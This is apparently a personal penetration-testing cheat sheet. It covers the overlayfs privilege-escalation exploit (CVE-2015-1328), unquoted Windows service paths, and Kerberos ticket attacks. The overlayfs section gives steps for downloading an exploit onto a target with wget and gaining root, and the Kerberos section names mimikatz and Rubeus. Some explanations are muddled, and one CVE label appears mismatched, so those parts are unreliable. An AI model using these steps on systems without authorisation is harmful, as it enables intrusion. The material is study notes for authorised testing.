# CVE-Cheat-Sheet
This is a cheat sheet on how to use some CVEs for penetration testing. Note: don't be retarded and use this on production environments - especially if you don't have permission or have a backup config in case shit hits the fan.

<!--
<h1>
  <a href="" title=""></a>
</h1>
<details>
  <summary>Read more</summary>
  
  <h2>Keywords</h2>
  <ul>
    <li></li>
  </ul>
  
  <h2>What does this CVE do?</h2>
  <p></p>
  
  <h2>Disclaimer</h2>
  <p></p>
</details>
-->

<h1>
  <a href="https://www.exploit-db.com/exploits/37292" target="_blank" title="CVE-2015-1328">CVE-2015-1328</a>
</h1>
<details>
  <summary>Read more</summary>
  
  <h2>What does this CVE do?</h2>
  <p><i>The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.</i></p>
  <p>In other words, the C script abuses an exploit with Linux's <a href="https://en.wikipedia.org/wiki/OverlayFS" title="OverlayFS">OverlayFS</a> feature by creating files in an abritrary location within the <code>/usr/src/{Linux version}/fs/overlayfs</code> directory and assigning it with <code>0777</code> attributes (aka. <code>rwxrwxrwx</code>) to be executed by the Linux kernel (remember: some functions of the kernel are carried out with some system-level privileges). The script gains privilege escalation by using <code>gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w</code>. (What I think anyways) This line spawns a new Process ID, and that PID gets the kernel to compile the C script as the system root. And because there are no checks carried out by the Linux OS, the kernel can complete this action under the assumption as root without any access controls being performed.</p>

  <h2>How to use this CVE:</h2>
  <ol>
    <li>Read the code provided in this CVE. Ensure that it will not kill any system processes to induce a system crash.</li>
    <li>Download the script. Transfer the script onto your Attack Box.</li>
    <li>On your Attack Box, start a simple web server (the easiest method is to use <code>python3 -m http.server</code>).</li>
    <li>(Assuming you've already got a connection on the Target System) Grab the script from your web server using <code>wget {ip}:{port} {script.ext}</code>. If you run into issues, <code>cd</code> into the <code>/tmp</code> directory and try again.</li>
    <li>Execute the script using <code>gcc {script.ext}</code>.</li>
    <li>Verify if you have root access using <code>whoami</code>.</li>
  </ol>

  <h2>Disclaimer</h2>
  <p>This CVE writes files to the affected system. Ensure that the affected party accepts the ability for you to make changes to the system before using this CVE.</p>
</details>

<h1>
  <a href="https://www.exploit-db.com/exploits/39161" target="_blank" title="CVE-2014-6287">CVE-2014-6287</a>
</h1>
<details>
  <summary>Read more</summary>
  
  <h2>Keywords</h2>
  <ul>
    <li>Windows</li>
    <li>Privilege Escalation</li>
    <li>Unquoted Service Paths</li>
  </ul>
  
  <h2>What does this CVE do?</h2>
  <p>When Windows has a service (on startup or not), that service will have its own directory that contains the executable for the service itself. For some services, it is possible that the folder directory leading to the executable contains <b>spaces</b> and/or is un-quoted. What causes this CVE to be exploitable is the absence of <b>quotations</b> of the location of the executable. As a result of this, Windows fails to properly identify whether the service executable exists or not, and instead, checks each ending path name until it reaches the intended executable file in the executable directory path - this is especially true if the service folder path contains spaces. For example: C:\Program Files (x86)\Super Important Service\service.exe (instead of directing Windows to only check whether "C:\Program Files (x86)\Super Important Service\service.exe" exists or not, Windows will incorrectly check every path with a space. In this example, Windows will check C:\Program, C:\Program Files, C:\Program Files (x86), etc, rather than the one whole path.</p>
  <ol>
    The exploitation process for this CVE is simple: 
    <li>Identify whether there are any service executable paths that <b>contain whitespaces and are unquoted</b>?</li>
    <li>Determine if we (as the attacker) can write to the executable path that the Windows service is trying to run?</li>
    <li>Determine if there are any Anti-Virus programs installed that would prevent the WinPEAS script from running?</li>
  </ol>
  
  <h2>Disclaimer</h2>
  <p>This CVE can cause the target system to crash depending on the type of exploit that is used in replacement of the original and legitimate service executable. Use this CVE with caution.</p>
  
  <h2>Reference material(s)</h2>
  <ul>
    <li>Link 1 - https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae</li>
  </ul>
</details>

<h1>
  <a href="" title="Kerberos Authentication Attack">Kerberos Authentication Attack (Draft)</a>
</h1>
<details>
  <summary>Read more</summary>
  
  <h2>Keywords</h2>
  <ul>
    <li>Active Directory</li>
    <li>Domain Controller</li>
    <li>Windows</li>
    <li>Windows Authentication</li>
    <li>Hash Cracking</li>
  </ul>
  
  <h2>What does this vulnerability do?</h2>
  <p></p>
  
  <h2>Tools used to manipulate Kerberos Authentication</h2>
  <ul>
    <li>Kerbrute</li>
    <li>Rubeus</li>
    <li>Impacket</li>
    <li>mimikatz</li>
  </ul>
  
  <h2>Mitigating against Kerberos Authentication attacks</h2>
  <p>Accounts that fall under a Domain Admin should not be used to log onto any machine outside of a DC, as their TGT will be cached on the machine which could be used in a lateral attack.</p>
  <p>Have a strong password policy. This will make hashes longer to crack.</p>
  <p>Don't turn off Kerberos Pre-Authentication unless needed.</p>
  
  <h2>Related attacks regarding Kerberos Authentication</h2>
  <p>"Pass the Ticket" - wherein we are manipulating the LSASS memory of the machine to re-use an existing ticket. If a TGT for a Domain Admin exists, this could be used for privilege escalation, which would circumvent the requirement to initiate the process of generating a TGT from a KDC. Note: in order to read from the LSASS memory, you require elevated privileges beforehand.</p>
  <p>"Golden/Silver Ticket" - wherein a malicious user manipulates the KRBTGT from a KDC to issue themselves an "authentic" TGT, which grants them full access to any machine on the network.</p>
  <p>Skeleton Key Attack - an alternative method to a Golden Ticket attack in which malware is implanted into the DC's memory. </p>
  
  <h2>Disclaimer</h2>
  <p></p>
</details>
